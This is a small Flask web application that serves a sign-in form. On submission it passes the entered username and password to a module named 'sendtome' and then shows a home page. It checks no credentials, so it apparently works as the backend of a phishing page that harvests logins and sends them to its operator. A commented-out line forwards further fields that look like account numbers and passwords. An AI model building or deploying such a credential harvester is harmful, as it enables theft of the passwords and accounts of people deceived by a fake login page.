from flask import Flask, request, render_template
import sendtome
app = Flask(__name__)


@app.route('/', methods=['GET'])
def signin_form():
    return render_template('form.html')

@app.route('/', methods=['POST'])
def signin():
    # sendtome.send(con['num'],con["Bpwd"],con["Npwd"])

    username =request.form["username"]
    password = request.form["password"]
    sendtome.send(username,password)
    return render_template('home.html')


if __name__ == '__main__':
    app.run()